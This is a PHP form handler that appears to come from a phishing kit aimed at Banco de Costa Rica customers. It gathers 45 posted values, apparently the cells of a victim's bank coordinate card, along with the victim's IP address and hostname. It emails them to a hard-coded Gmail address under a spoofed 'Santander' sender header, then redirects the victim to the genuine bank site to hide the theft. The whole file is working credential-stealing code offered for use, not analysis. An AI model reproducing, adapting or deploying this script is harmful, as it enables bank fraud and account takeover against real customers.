<?
	$ip6 = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$ipv = getenv("REMOTE_ADDR");
	$dat3 =date("D M d, Y ");

	$to = "equipo13111@gmail.com";
	$subj = "Coords BCR - $ipv";
	$msj = "\n
--------------------------- Coordenadas de $ipv --------------------------------
<html>
<head>
<body>
<table width='200' border='1'>
  <tr>
    <td bgcolor='#AE3939'>&nbsp;</td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>A</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>B</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>C</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>D</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>E</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>F</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>G</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>H</font></td>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>I</font></td>
 
  </tr>
  <tr>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>1</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['m1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['e1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['r1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['c1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['a1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['n1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['t1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['i1']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['l1']}</font></td>
   
  </tr>
  <tr>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>2</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['m2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['e2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['r2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['c2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['a2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['n2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['t2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['i2']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['l2']}</font></td>
    
  </tr>
  <tr>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>3</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['m3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['e3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['r3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['c3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['a3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['n3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['t3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['i3']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['l3']}</font></td>
   
  </tr>
  <tr>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>4</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['m4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['e4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['r4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['c4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['a4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['n4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['t4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['i4']}</font></td>
    <td bgcolor='#C55050'><font color='#FFFFFF' size='4'>{$_POST['l4']}</font></td>
    
  </tr>
  <tr>
    <td bgcolor='#AE3939'><font color='#FFFFFF' size='4'>5</td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['m5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['e5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['r5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['c5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['a5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['n5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['t5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['i5']}</font></td>
    <td bgcolor='#D27777'><font color='#FFFFFF' size='4'>{$_POST['l5']}</font></td>
    
  </tr>
</table>
</body>
</html>
 	 Ip:	  $ipv<br>
     Host:      $ip6<br>
	 Fecha:	  $dat3<br><br>
----------------------------------------------------------------<br>
  ";

$headers = "From: Santander Coords <Owned@Santander.cl>\n";
$headers .= "Content-Type: text/html; charset=iso-8859-1\n";
$headers .= "\n";
	mail($to, $subj, $msj,$headers);

header("Location: http://www.bancobcr.com");
?>